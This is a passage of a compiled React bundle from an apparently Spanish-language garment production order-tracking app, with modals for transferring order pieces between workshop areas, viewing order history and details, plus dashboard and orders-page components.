import { jsx as jsx44, jsxs as jsxs18 } from "react/jsx-runtime";
function TransferModal({ open, onClose, orderId }) {
  const { toast: toast2 } = useToast();
  const { user } = useAuth();
  const queryClient2 = useQueryClient();
  const [transferData, setTransferData] = useState27({
    toArea: "",
    pieces: "",
    notes: ""
  });
  const { data: order } = useQuery({
    queryKey: ["/api/orders", orderId],
    enabled: !!orderId
  });
  const { data: orderPieces = [], isLoading: isLoadingPieces } = useQuery({
    queryKey: [`/api/orders/${orderId}/pieces`],
    enabled: !!orderId
  });
  const createTransferMutation = useMutation({
    mutationFn: async (data) => {
      const res = await apiRequest("POST", "/api/transfers", {
        orderId,
        toArea: data.toArea,
        pieces: parseInt(data.pieces),
        notes: data.notes
      });
      return await res.json();
    },
    onSuccess: () => {
      import_sweetalert24.default.fire({
        title: "\xA1Transferencia enviada!",
        text: "El pedido ha sido transferido para aprobaci\xF3n.",
        imageUrl: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8cGF0aCBkPSJNMjUgNDIgTDI1IDIgTTI1IDIgTDEwIDE3IE0yNSAyIEw0MCAxNyIgc3Ryb2tlPSIjMDA4OEZGIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiPgogICAgPGFuaW1hdGUgYXR0cmlidXRlTmFtZT0ic3Ryb2tlLWRhc2hhcnJheSIgdmFsdWVzPSIyIDUgMiA1OzIgNSAyIDUiIGR1cj0iMXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiAvPgogIDwvcGF0aD4KPC9zdmc+",
        imageWidth: 80,
        imageHeight: 80,
        imageAlt: "Flecha animada hacia arriba",
        showConfirmButton: false,
        timer: 2e3,
        customClass: {
          popup: "font-sans"
        }
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
      queryClient2.invalidateQueries({ queryKey: [`/api/orders/${orderId}/pieces`] });
      queryClient2.invalidateQueries({ queryKey: ["/api/transfers/pending"] });
      onClose();
      setTransferData({
        toArea: "",
        pieces: "",
        notes: ""
      });
    },
    onError: (error) => {
      toast2({
        title: "Error al transferir",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  const handleSubmit = (e) => {
    e.preventDefault();
    const availablePieces = getCurrentAreaPieces();
    const requestedPieces = parseInt(transferData.pieces);
    if (requestedPieces > availablePieces) {
      toast2({
        title: "Error en transferencia",
        description: `No puedes transferir ${requestedPieces} piezas. Solo tienes ${availablePieces} disponibles en ${user?.area ? getAreaDisplayName(user.area) : "tu \xE1rea"}.`,
        variant: "destructive"
      });
      return;
    }
    createTransferMutation.mutate(transferData);
  };
  const getNextAreas = () => {
    if (!user) return [];
    const areaFlow = {
      corte: ["bordado", "ensamble", "plancha", "calidad", "envios"],
      bordado: ["ensamble", "plancha", "calidad", "envios"],
      ensamble: ["plancha", "calidad", "envios"],
      plancha: ["calidad", "envios"],
      calidad: ["envios"],
      envios: [],
      admin: ["bordado", "ensamble", "plancha", "calidad", "envios"]
    };
    return areaFlow[user.area] || [];
  };
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      almacen: "Almac\xE9n",
      admin: "Admin"
    };
    return names[area] || area;
  };
  const getCurrentAreaPieces = () => {
    const piecesArr = orderPieces;
    if (!user || !piecesArr.length) return 0;
    const currentAreaPieces = piecesArr.find((p) => p.area === user.area);
    console.log("User area:", user.area, "Order pieces:", piecesArr, "Found pieces:", currentAreaPieces);
    return currentAreaPieces?.pieces || 0;
  };
  const nextAreas = getNextAreas();
  return /* @__PURE__ */ jsx44(Dialog2, { open, onOpenChange: onClose, children: /* @__PURE__ */ jsxs18(DialogContent2, { className: "max-w-md", children: [
    /* @__PURE__ */ jsx44(DialogHeader, { children: /* @__PURE__ */ jsx44(DialogTitle2, { children: "Transferir Pedido" }) }),
    isLoadingPieces && /* @__PURE__ */ jsxs18("div", { className: "flex items-center justify-center p-4", children: [
      /* @__PURE__ */ jsx44(LoaderCircle, { className: "h-6 w-6 animate-spin" }),
      /* @__PURE__ */ jsx44("span", { className: "ml-2", children: "Cargando piezas disponibles..." })
    ] }),
    !isLoadingPieces && /* @__PURE__ */ jsxs18("form", { onSubmit: handleSubmit, children: [
      /* @__PURE__ */ jsxs18("div", { className: "space-y-4", children: [
        /* @__PURE__ */ jsxs18("div", { children: [
          /* @__PURE__ */ jsx44(Label2, { children: "Folio del Pedido" }),
          /* @__PURE__ */ jsx44(Input, { value: order?.folio || "", readOnly: true, className: "bg-gray-50" })
        ] }),
        /* @__PURE__ */ jsxs18("div", { className: "bg-blue-50 border border-blue-200 rounded-lg p-3", children: [
          /* @__PURE__ */ jsxs18("p", { className: "text-sm text-blue-800", children: [
            /* @__PURE__ */ jsxs18("strong", { children: [
              "Piezas disponibles en ",
              user?.area ? getAreaDisplayName(user.area) : "tu \xE1rea",
              ":"
            ] }),
            " ",
            getCurrentAreaPieces()
          ] }),
          /* @__PURE__ */ jsxs18("p", { className: "text-xs text-blue-600 mt-1", children: [
            "Total del pedido: ",
            order?.totalPiezas || 0,
            " piezas"
          ] })
        ] }),
        getCurrentAreaPieces() === 0 && /* @__PURE__ */ jsx44("div", { className: "bg-yellow-50 border border-yellow-200 rounded-lg p-3", children: /* @__PURE__ */ jsx44("p", { className: "text-sm text-yellow-800", children: "No tienes piezas disponibles en tu \xE1rea para este pedido." }) }),
        /* @__PURE__ */ jsxs18("div", { children: [
          /* @__PURE__ */ jsx44(Label2, { children: "Transferir a" }),
          /* @__PURE__ */ jsxs18(
            Select2,
            {
              value: transferData.toArea,
              onValueChange: (value) => setTransferData((prev) => ({ ...prev, toArea: value })),
              children: [
                /* @__PURE__ */ jsx44(SelectTrigger2, { children: /* @__PURE__ */ jsx44(SelectValue2, { placeholder: "Seleccionar \xE1rea..." }) }),
                /* @__PURE__ */ jsx44(SelectContent2, { children: nextAreas.map((area) => /* @__PURE__ */ jsx44(SelectItem2, { value: area, children: getAreaDisplayName(area) }, area)) })
              ]
            }
          )
        ] }),
        /* @__PURE__ */ jsxs18("div", { children: [
          /* @__PURE__ */ jsx44(Label2, { children: "Cantidad a transferir" }),
          /* @__PURE__ */ jsxs18("div", { className: "space-y-2", children: [
            /* @__PURE__ */ jsxs18("div", { className: "flex items-center space-x-2", children: [
              /* @__PURE__ */ jsx44(
                Input,
                {
                  type: "number",
                  min: "1",
                  max: getCurrentAreaPieces(),
                  value: transferData.pieces,
                  onChange: (e) => setTransferData((prev) => ({ ...prev, pieces: e.target.value })),
                  required: true
                }
              ),
              /* @__PURE__ */ jsxs18("span", { className: "text-sm text-gray-500", children: [
                "de ",
                getCurrentAreaPieces(),
                " disponibles en ",
                user?.area ? getAreaDisplayName(user.area) : ""
              ] })
            ] }),
            /* @__PURE__ */ jsxs18("div", { className: "text-xs text-gray-400", children: [
              "Total del pedido: ",
              order?.totalPiezas || 0,
              " piezas"
            ] })
          ] })
        ] }),
        /* @__PURE__ */ jsxs18("div", { children: [
          /* @__PURE__ */ jsx44(Label2, { children: "Notas (opcional)" }),
          /* @__PURE__ */ jsx44(
            Textarea,
            {
              rows: 3,
              placeholder: "Agregar comentarios sobre la transferencia...",
              value: transferData.notes,
              onChange: (e) => setTransferData((prev) => ({ ...prev, notes: e.target.value }))
            }
          )
        ] })
      ] }),
      /* @__PURE__ */ jsxs18("div", { className: "flex justify-end space-x-3 mt-6", children: [
        /* @__PURE__ */ jsx44(Button, { type: "button", variant: "outline", onClick: onClose, children: "Cancelar" }),
        /* @__PURE__ */ jsxs18(
          Button,
          {
            type: "submit",
            disabled: createTransferMutation.isPending || getCurrentAreaPieces() === 0,
            children: [
              createTransferMutation.isPending && /* @__PURE__ */ jsx44(LoaderCircle, { className: "mr-2 h-4 w-4 animate-spin" }),
              "Transferir"
            ]
          }
        )
      ] })
    ] })
  ] }) });
}

// client/src/components/orders/order-history-modal.tsx
import { jsx as jsx45, jsxs as jsxs19 } from "react/jsx-runtime";
function OrderHistoryModal({ open, onClose, orderId }) {
  const { data: order } = useQuery({
    queryKey: ["/api/orders", orderId],
    enabled: !!orderId
  });
  const { data: history2 = [], isLoading } = useQuery({
    queryKey: ["/api/orders", orderId, "history"],
    enabled: !!orderId
  });
  const getActionIcon = (action) => {
    switch (action) {
      case "created":
        return /* @__PURE__ */ jsx45(Plus, { className: "text-white", size: 16 });
      case "transfer_created":
        return /* @__PURE__ */ jsx45(ArrowRight, { className: "text-white", size: 16 });
      case "transfer_accepted":
        return /* @__PURE__ */ jsx45(CircleCheckBig, { className: "text-white", size: 16 });
      case "transfer_rejected":
        return /* @__PURE__ */ jsx45(X, { className: "text-white", size: 16 });
      case "completed":
        return /* @__PURE__ */ jsx45(CircleCheckBig, { className: "text-white", size: 16 });
      default:
        return /* @__PURE__ */ jsx45(Clock, { className: "text-white", size: 16 });
    }
  };
  const getActionColor = (action) => {
    switch (action) {
      case "created":
        return "bg-green-500";
      case "transfer_created":
        return "bg-blue-500";
      case "transfer_accepted":
        return "bg-green-500";
      case "transfer_rejected":
        return "bg-red-500";
      case "completed":
        return "bg-green-500";
      default:
        return "bg-gray-500";
    }
  };
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      admin: "Admin"
    };
    return names[area] || area;
  };
  const formatDate = (date) => {
    return new Date(date).toLocaleString("es-ES", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });
  };
  if (isLoading) {
    return /* @__PURE__ */ jsx45(Dialog2, { open, onOpenChange: onClose, children: /* @__PURE__ */ jsxs19(DialogContent2, { className: "max-w-2xl max-h-[90vh] overflow-y-auto", children: [
      /* @__PURE__ */ jsx45(DialogHeader, { children: /* @__PURE__ */ jsx45(DialogTitle2, { children: "Cargando historial..." }) }),
      /* @__PURE__ */ jsx45("div", { className: "animate-pulse space-y-4", children: [...Array(3)].map((_, i) => /* @__PURE__ */ jsx45("div", { className: "h-20 bg-gray-200 rounded" }, i)) })
    ] }) });
  }
  return /* @__PURE__ */ jsx45(Dialog2, { open, onOpenChange: onClose, children: /* @__PURE__ */ jsxs19(DialogContent2, { className: "max-w-2xl max-h-[90vh] overflow-y-auto", children: [
    /* @__PURE__ */ jsx45(DialogHeader, { children: /* @__PURE__ */ jsxs19(DialogTitle2, { children: [
      "Historial del Pedido #",
      order?.orderId
    ] }) }),
    /* @__PURE__ */ jsxs19("div", { className: "space-y-4", children: [
      history2.map((event, index2) => /* @__PURE__ */ jsxs19("div", { className: "flex items-start space-x-4 p-4 bg-gray-50 rounded-lg", children: [
        /* @__PURE__ */ jsx45("div", { className: `w-10 h-10 ${getActionColor(event.action)} rounded-full flex items-center justify-center`, children: getActionIcon(event.action) }),
        /* @__PURE__ */ jsx45("div", { className: "flex-1", children: /* @__PURE__ */ jsxs19("div", { className: "flex justify-between items-start", children: [
          /* @__PURE__ */ jsxs19("div", { children: [
            /* @__PURE__ */ jsxs19("h4", { className: "font-medium text-gray-800", children: [
              event.action === "created" && "Pedido Creado",
              event.action === "transfer_created" && "Transferencia Enviada",
              event.action === "transfer_accepted" && "Transferencia Aceptada",
              event.action === "transfer_rejected" && "Transferencia Rechazada",
              event.action === "completed" && "Pedido Finalizado",
              !["created", "transfer_created", "transfer_accepted", "transfer_rejected", "completed"].includes(event.action) && event.action
            ] }),
            /* @__PURE__ */ jsx45("p", { className: "text-sm text-gray-600", children: event.description }),
            /* @__PURE__ */ jsx45("p", { className: "text-sm text-gray-500 mt-1", children: formatDate(event.createdAt) })
          ] }),
          /* @__PURE__ */ jsxs19("div", { className: "flex flex-col items-end space-y-1", children: [
            event.fromArea && event.toArea && /* @__PURE__ */ jsxs19(Badge, { variant: "outline", className: "text-xs", children: [
              getAreaDisplayName(event.fromArea),
              " \u2192 ",
              getAreaDisplayName(event.toArea)
            ] }),
            event.pieces && /* @__PURE__ */ jsxs19(Badge, { variant: "secondary", className: "text-xs", children: [
              event.pieces,
              " piezas"
            ] })
          ] })
        ] }) })
      ] }, event.id)),
      history2.length === 0 && /* @__PURE__ */ jsx45("div", { className: "text-center py-8 text-gray-500", children: "No hay historial disponible para este pedido" })
    ] })
  ] }) });
}

// client/src/components/orders/order-details-modal.tsx
import { jsx as jsx46, jsxs as jsxs20 } from "react/jsx-runtime";
function OrderDetailsModal({ open, onClose, orderId }) {
  const { data: order, isLoading: isLoadingOrder } = useQuery({
    queryKey: ["/api/orders", orderId],
    enabled: !!orderId
  });
  const { data: orderPieces = [], isLoading: isLoadingPieces } = useQuery({
    queryKey: [`/api/orders/${orderId}/pieces`],
    enabled: !!orderId
  });
  const { data: history2 = [], isLoading: isLoadingHistory } = useQuery({
    queryKey: [`/api/orders/${orderId}/history`],
    enabled: !!orderId
  });
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      admin: "Admin"
    };
    return names[area] || area;
  };
  const getAreaBadgeColor = (area) => {
    const colors = {
      corte: "bg-green-100 text-green-800",
      bordado: "bg-blue-100 text-blue-800",
      ensamble: "bg-purple-100 text-purple-800",
      plancha: "bg-orange-100 text-orange-800",
      calidad: "bg-pink-100 text-pink-800",
      envios: "bg-purple-100 text-purple-800",
      admin: "bg-gray-100 text-gray-800"
    };
    return colors[area] || "bg-gray-100 text-gray-800";
  };
  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleDateString("es-ES", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });
  };
  const isLoading = isLoadingOrder || isLoadingPieces || isLoadingHistory;
  return /* @__PURE__ */ jsx46(Dialog2, { open, onOpenChange: onClose, children: /* @__PURE__ */ jsxs20(DialogContent2, { className: "max-w-4xl max-h-[90vh] overflow-y-auto", children: [
    /* @__PURE__ */ jsx46(DialogHeader, { children: /* @__PURE__ */ jsxs20(DialogTitle2, { className: "flex items-center space-x-2", children: [
      /* @__PURE__ */ jsx46(Package, { className: "h-5 w-5" }),
      /* @__PURE__ */ jsx46("span", { children: "Detalles del Pedido" })
    ] }) }),
    isLoading ? /* @__PURE__ */ jsxs20("div", { className: "flex items-center justify-center p-8", children: [
      /* @__PURE__ */ jsx46(LoaderCircle, { className: "h-8 w-8 animate-spin" }),
      /* @__PURE__ */ jsx46("span", { className: "ml-2", children: "Cargando detalles..." })
    ] }) : /* @__PURE__ */ jsxs20("div", { className: "space-y-6", children: [
      /* @__PURE__ */ jsxs20(Card, { children: [
        /* @__PURE__ */ jsx46(CardHeader, { children: /* @__PURE__ */ jsxs20(CardTitle, { className: "flex items-center space-x-2", children: [
          /* @__PURE__ */ jsx46(MapPin, { className: "h-4 w-4" }),
          /* @__PURE__ */ jsx46("span", { children: "Informaci\xF3n General" })
        ] }) }),
        /* @__PURE__ */ jsxs20(CardContent, { children: [
          /* @__PURE__ */ jsxs20("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4", children: [
            /* @__PURE__ */ jsxs20("div", { children: [
              /* @__PURE__ */ jsx46("h3", { className: "font-semibold text-lg mb-2", children: order?.folio }),
              /* @__PURE__ */ jsxs20("div", { className: "space-y-2 text-sm", children: [
                /* @__PURE__ */ jsxs20("div", { children: [
                  /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "Cliente/Hotel:" }),
                  " ",
                  order?.clienteHotel
                ] }),
                /* @__PURE__ */ jsxs20("div", { children: [
                  /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "No. Solicitud:" }),
                  " ",
                  order?.noSolicitud
                ] }),
                /* @__PURE__ */ jsxs20("div", { children: [
                  /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "No. Hoja:" }),
                  " ",
                  order?.noHoja
                ] }),
                /* @__PURE__ */ jsxs20("div", { children: [
                  /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "Modelo:" }),
                  " ",
                  order?.modelo
                ] })
              ] })
            ] }),
            /* @__PURE__ */ jsxs20("div", { className: "space-y-2 text-sm", children: [
              /* @__PURE__ */ jsxs20("div", { children: [
                /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "Tipo de Prenda:" }),
                " ",
                order?.tipoPrenda
              ] }),
              /* @__PURE__ */ jsxs20("div", { children: [
                /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "Color:" }),
                " ",
                order?.color
              ] }),
              /* @__PURE__ */ jsxs20("div", { children: [
                /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "Tela:" }),
                " ",
                order?.tela
              ] }),
              /* @__PURE__ */ jsxs20("div", { children: [
                /* @__PURE__ */ jsx46("span", { className: "font-medium", children: "Total Piezas:" }),
                " ",
                order?.totalPiezas
              ] })
            ] })
          ] }),
          /* @__PURE__ */ jsxs20("div", { className: "flex items-center space-x-4 mt-4", children: [
            /* @__PURE__ */ jsxs20("div", { className: "flex items-center space-x-2", children: [
              /* @__PURE__ */ jsx46("span", { className: "text-sm font-medium", children: "Estado:" }),
              /* @__PURE__ */ jsx46(Badge, { className: order?.status === "completed" ? "bg-green-100 text-green-800" : "bg-yellow-100 text-yellow-800", children: order?.status === "completed" ? "Finalizado" : "En Proceso" })
            ] }),
            /* @__PURE__ */ jsxs20("div", { className: "flex items-center space-x-2", children: [
              /* @__PURE__ */ jsx46("span", { className: "text-sm font-medium", children: "\xC1rea Actual:" }),
              /* @__PURE__ */ jsx46(Badge, { className: getAreaBadgeColor(order?.currentArea), children: getAreaDisplayName(order?.currentArea) })
            ] })
          ] })
        ] })
      ] }),
      /* @__PURE__ */ jsxs20(Card, { children: [
        /* @__PURE__ */ jsx46(CardHeader, { children: /* @__PURE__ */ jsx46(CardTitle, { children: "Distribuci\xF3n de Piezas por \xC1rea" }) }),
        /* @__PURE__ */ jsx46(CardContent, { children: orderPieces.length > 0 ? /* @__PURE__ */ jsx46("div", { className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4", children: orderPieces.map((piece) => /* @__PURE__ */ jsxs20("div", { className: "flex items-center justify-between p-3 bg-gray-50 rounded-lg", children: [
          /* @__PURE__ */ jsx46("div", { className: "flex items-center space-x-2", children: /* @__PURE__ */ jsx46(Badge, { className: getAreaBadgeColor(piece.area), children: getAreaDisplayName(piece.area) }) }),
          /* @__PURE__ */ jsxs20("span", { className: "font-semibold", children: [
            piece.pieces,
            " piezas"
          ] })
        ] }, piece.id)) }) : /* @__PURE__ */ jsx46("p", { className: "text-gray-500 text-center py-4", children: "No hay distribuci\xF3n de piezas disponible" }) })
      ] }),
      /* @__PURE__ */ jsxs20(Card, { children: [
        /* @__PURE__ */ jsx46(CardHeader, { children: /* @__PURE__ */ jsxs20(CardTitle, { className: "flex items-center space-x-2", children: [
          /* @__PURE__ */ jsx46(Calendar, { className: "h-4 w-4" }),
          /* @__PURE__ */ jsx46("span", { children: "Ruta del Pedido" })
        ] }) }),
        /* @__PURE__ */ jsx46(CardContent, { children: history2.length > 0 ? /* @__PURE__ */ jsx46("div", { className: "space-y-4", children: history2.map((item, index2) => /* @__PURE__ */ jsxs20("div", { className: "flex items-start space-x-4 relative", children: [
          index2 < history2.length - 1 && /* @__PURE__ */ jsx46("div", { className: "absolute left-4 top-8 w-0.5 h-12 bg-gray-200" }),
          /* @__PURE__ */ jsx46("div", { className: `w-8 h-8 rounded-full flex items-center justify-center ${item.action === "created" ? "bg-green-100 text-green-600" : item.action === "transfer_accepted" ? "bg-blue-100 text-blue-600" : item.action === "completed" ? "bg-purple-100 text-purple-600" : "bg-gray-100 text-gray-600"}`, children: item.action === "created" ? /* @__PURE__ */ jsx46(Package, { className: "h-4 w-4" }) : item.action === "transfer_accepted" ? /* @__PURE__ */ jsx46(MapPin, { className: "h-4 w-4" }) : item.action === "completed" ? /* @__PURE__ */ jsx46(Calendar, { className: "h-4 w-4" }) : /* @__PURE__ */ jsx46(User, { className: "h-4 w-4" }) }),
          /* @__PURE__ */ jsx46("div", { className: "flex-1", children: /* @__PURE__ */ jsxs20("div", { className: "flex items-center justify-between", children: [
            /* @__PURE__ */ jsxs20("div", { children: [
              /* @__PURE__ */ jsxs20("p", { className: "font-medium text-gray-900", children: [
                item.action === "created" && "Creado",
                item.action === "transfer_accepted" && "Transferido",
                item.action === "completed" && "Finalizado",
                item.action === "transfer_requested" && "Transferencia Solicitada",
                item.fromArea && item.toArea && `: ${getAreaDisplayName(item.fromArea)} \u2192 ${getAreaDisplayName(item.toArea)}`,
                item.action === "created" && `: ${getAreaDisplayName(order?.currentArea)}`
              ] }),
              /* @__PURE__ */ jsx46("p", { className: "text-sm text-gray-600", children: item.description }),
              item.pieces && /* @__PURE__ */ jsxs20("p", { className: "text-xs text-gray-500", children: [
                item.pieces,
                " piezas"
              ] })
            ] }),
            /* @__PURE__ */ jsx46("span", { className: "text-sm text-gray-500", children: formatDate(item.createdAt) })
          ] }) })
        ] }, item.id)) }) : /* @__PURE__ */ jsx46("p", { className: "text-gray-500 text-center py-4", children: "No hay historial disponible" }) })
      ] })
    ] })
  ] }) });
}

// client/src/pages/dashboard.tsx
import { jsx as jsx47, jsxs as jsxs21 } from "react/jsx-runtime";
function Dashboard() {
  const { user } = useAuth();
  const [searchTerm, setSearchTerm] = useState28("");
  const [showTransfer, setShowTransfer] = useState28(false);
  const [showHistory, setShowHistory] = useState28(false);
  const [showDetails, setShowDetails] = useState28(false);
  const [selectedOrderId, setSelectedOrderId] = useState28(null);
  const canCreateOrders = user?.area === "corte" || user?.area === "admin";
  const handleTransferOrder = (orderId) => {
    setSelectedOrderId(orderId);
    setShowTransfer(true);
  };
  const handleViewHistory = (orderId) => {
    setSelectedOrderId(orderId);
    setShowHistory(true);
  };
  const handleViewDetails = (orderId) => {
    setSelectedOrderId(orderId);
    setShowDetails(true);
  };
  return /* @__PURE__ */ jsxs21(Layout, { children: [
    /* @__PURE__ */ jsxs21("div", { className: "flex justify-between items-center mb-6", children: [
      /* @__PURE__ */ jsxs21("div", { children: [
        /* @__PURE__ */ jsx47("h2", { className: "text-2xl font-bold text-gray-800", children: "Tablero" }),
        /* @__PURE__ */ jsx47("p", { className: "text-gray-600", children: "Gesti\xF3n de pedidos en tiempo real" })
      ] }),
      /* @__PURE__ */ jsx47("div", { className: "flex items-center space-x-4", children: /* @__PURE__ */ jsxs21("div", { className: "relative", children: [
        /* @__PURE__ */ jsx47(
          Input,
          {
            type: "text",
            placeholder: "Buscar por folio...",
            className: "w-64 pl-10",
            value: searchTerm,
            onChange: (e) => setSearchTerm(e.target.value)
          }
        ),
        /* @__PURE__ */ jsx47(Search, { className: "absolute left-3 top-3 h-4 w-4 text-gray-400" })
      ] }) })
    ] }),
    /* @__PURE__ */ jsx47(StatsCards, {}),
    /* @__PURE__ */ jsxs21("div", { className: "mb-6", children: [
      /* @__PURE__ */ jsx47("h3", { className: "text-lg font-semibold text-gray-800 mb-4", children: "Actividad Reciente" }),
      /* @__PURE__ */ jsx47(RecentActivity, {})
    ] }),
    /* @__PURE__ */ jsx47(
      OrdersTable,
      {
        searchTerm,
        onTransferOrder: handleTransferOrder,
        onViewHistory: handleViewHistory,
        onViewDetails: handleViewDetails
      }
    ),
    showTransfer && selectedOrderId && /* @__PURE__ */ jsx47(
      TransferModal,
      {
        open: showTransfer,
        onClose: () => setShowTransfer(false),
        orderId: selectedOrderId
      }
    ),
    showHistory && selectedOrderId && /* @__PURE__ */ jsx47(
      OrderHistoryModal,
      {
        open: showHistory,
        onClose: () => setShowHistory(false),
        orderId: selectedOrderId
      }
    ),
    showDetails && selectedOrderId && /* @__PURE__ */ jsx47(
      OrderDetailsModal,
      {
        open: showDetails,
        onClose: () => setShowDetails(false),
        orderId: selectedOrderId
      }
    )
  ] });
}

// client/src/pages/orders-page.tsx
import { useState as useState29 } from "react";
import { jsx as jsx48, jsxs as jsxs22 } from "react/jsx-runtime";
function OrdersPage() {
  const { user } = useAuth();
  const { toast: toast2 } = useToast();
  const queryClient2 = useQueryClient();
  const [searchTerm, setSearchTerm] = useState29("");
  const [areaFilter, setAreaFilter] = useState29("all");
  const [statusFilter, setStatusFilter] = useState29("all");
  const [showTransfer, setShowTransfer] = useState29(false);
  const [showHistory, setShowHistory] = useState29(false);
  const [showDetails, setShowDetails] = useState29(false);
  const [selectedOrderId, setSelectedOrderId] = useState29(null);
  const { data: orders = [], isLoading } = useQuery({
    queryKey: ["/api/orders"]
  });
  const completeOrderMutation = useMutation({
    mutationFn: async (orderId) => {
      const res = await apiRequest("POST", `/api/orders/${orderId}/complete`);
      return await res.json();
    },
    onSuccess: () => {
      toast2({
        title: "Pedido finalizado",
        description: "El pedido ha sido marcado como completado"
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
    },
    onError: (error) => {
      toast2({
        title: "Error al finalizar pedido",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  const deleteOrderMutation = useMutation({
    mutationFn: async (orderId) => {
      const res = await apiRequest("DELETE", `/api/orders/${orderId}`);
      return await res.json();
    },
    onSuccess: () => {
      toast2({
        title: "Pedido eliminado",
        description: "El pedido ha sido eliminado permanentemente"
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
    },
    onError: (error) => {
      toast2({
        title: "Error al eliminar pedido",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  const canCreateOrders = user?.area === "corte" || user?.area === "admin";
  const getAreaBadgeColor = (area) => {
    const colors = {
      corte: "bg-green-100 text-green-800",
      bordado: "bg-blue-100 text-blue-800",
      ensamble: "bg-purple-100 text-purple-800",
      plancha: "bg-orange-100 text-orange-800",
      calidad: "bg-pink-100 text-pink-800",
      envios: "bg-purple-100 text-purple-800",
      almacen: "bg-indigo-100 text-indigo-800",
      admin: "bg-gray-100 text-gray-800",
      dise\u00F1o: "bg-cyan-100 text-cyan-800"
    };
    return colors[area] || "bg-gray-100 text-gray-800";
  };
  const getStatusBadgeColor = (status) => {
    return status === "completed" ? "bg-green-100 text-green-800" : "bg-yellow-100 text-yellow-800";
  };
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      admin: "Admin"
    };
    return names[area] || area;
  };
  const filteredOrders = orders.filter((order) => {
    const matchesSearch = searchTerm === "" || order.folio.toLowerCase().includes(searchTerm.toLowerCase()) || order.clienteHotel.toLowerCase().includes(searchTerm.toLowerCase()) || order.modelo.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesArea = areaFilter === "all" || order.currentArea === areaFilter;
    const matchesStatus = statusFilter === "all" || order.status === statusFilter;
    return matchesSearch && matchesArea && matchesStatus;
  });
  const handleTransferOrder = (orderId) => {
    setSelectedOrderId(orderId);
    setShowTransfer(true);
  };
  const handleViewHistory = (orderId) => {
    setSelectedOrderId(orderId);
    setShowHistory(true);
  };
  const handleViewDetails = (orderId) => {
    setSelectedOrderId(orderId);
    setShowDetails(true);
  };
  return /* @__PURE__ */ jsx48(Layout, { children: /* @__PURE__ */ jsxs22("div", { className: "space-y-6", children: [
    /* @__PURE__ */ jsx48("div", { className: "flex justify-between items-center", children: /* @__PURE__ */ jsxs22("div", { children: [
      /* @__PURE__ */ jsx48("h1", { className: "text-3xl font-bold text-gray-800", children: "Gesti\xF3n de Pedidos" }),
      /* @__PURE__ */ jsx48("p", { className: "text-gray-600 mt-2", children: "Control completo de pedidos y transferencias" })
    ] }) }),
    /* @__PURE__ */ jsxs22(Card, { children: [
      /* @__PURE__ */ jsx48(CardHeader, { children: /* @__PURE__ */ jsx48(CardTitle, { children: "Filtros" }) }),
      /* @__PURE__ */ jsx48(CardContent, { children: /* @__PURE__ */ jsxs22("div", { className: "grid grid-cols-1 md:grid-cols-3 gap-4", children: [
        /* @__PURE__ */ jsxs22("div", { className: "relative", children: [
          /* @__PURE__ */ jsx48(
            Input,
            {
              type: "text",
              placeholder: "Buscar por folio, cliente o modelo...",
              className: "pl-10",
              value: searchTerm,
              onChange: (e) => setSearchTerm(e.target.value)
            }
          ),
          /* @__PURE__ */ jsx48(Search, { className: "absolute left-3 top-3 h-4 w-4 text-gray-400" })
        ] }),
        /* @__PURE__ */ jsxs22(Select2, { value: areaFilter, onValueChange: setAreaFilter, children: [
          /* @__PURE__ */ jsx48(SelectTrigger2, { children: /* @__PURE__ */ jsx48(SelectValue2, { placeholder: "Filtrar por \xE1rea" }) }),
          /* @__PURE__ */ jsxs22(SelectContent2, { children: [
            /* @__PURE__ */ jsx48(SelectItem2, { value: "all", children: "Todas las \xC1reas" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "corte", children: "Corte" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "bordado", children: "Bordado" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "ensamble", children: "Ensamble" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "plancha", children: "Plancha/Empaque" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "calidad", children: "Calidad" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "envios", children: "Env\xEDos" })
          ] })
        ] }),
        /* @__PURE__ */ jsxs22(Select2, { value: statusFilter, onValueChange: setStatusFilter, children: [
